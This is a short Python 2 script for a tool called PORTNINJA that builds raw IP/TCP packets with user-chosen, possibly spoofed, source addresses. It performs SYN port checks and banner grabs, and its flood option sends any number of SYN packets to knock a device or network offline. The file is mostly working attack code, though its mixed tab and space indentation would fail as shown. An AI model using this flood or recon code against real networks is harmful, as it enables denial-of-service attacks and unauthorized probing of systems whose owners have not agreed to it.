#!/usr/bin/python
# PORTNINJA: PORT SCANNER DESIGNED TO PERFORM NETWORK RECON OPERATIONS
import sys
import socket
import select
import os
import subprocess
import syn_flood
import ports
import argparse

def main():
	syn_flood.permissions()
	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        syn_flood.createSock(s)
	parser = argparse.ArgumentParser(description='SYN Scan and flood tool which forms raw packets taking required IP addresses and port numbers')
        parser.add_argument("sip", help='Source IP Address to form packet', type=str)
        parser.add_argument("dip", help='Destination IP address to form packet', type=str)
	parser.add_argument("sport", help='Source port to form packet', type=int)
	parser.add_argument("dport", help='Destination port to form packet', type=int)
	parser.add_argument("-f", "--flood", help="SYN Flood option to send arbituary number of packets to flood device or network", type=int)
	parser.add_argument("-p", "--ports", help="Port switch which will take a number of ports and scan them against destination ip")
        args = parser.parse_args()

        ip_header = syn_flood.ipCreate(args.sip, args.dip)
        tcp_header = syn_flood.tcpCreate(args.sip, args.dip, args.sport, args.dport)
        packet = ip_header + tcp_header
        if args.flood:
		print("Flood option selected: Sending packets...")
                i = 0
                value = int(args.flood)
                while i < value:
                        i += 1
                        print("Packets sent: {}".format(i))
                        result = s.sendto(packet, (args.dip, 0))
	elif args.ports:
		print("You selected ports {}".format(args.ports))
#	progCheck()
#	ip = (str(sys.argv[1]))
#	port = int((sys.argv[2]))
	ports.portNumLimit(args.sport)
	ports.portNumLimit(args.dport)
	print('IP Address is: ' + args.dip)
	#IPaddressCheck()
	ports.TCPportCheck(args.dip, args.dport)
	print('Performing banner grab')
	ports.TCPbannerGrab(args.dip, args.dport)

if __name__ == '__main__':
	main()

# Working version of Python - Python 2.7.15rc1

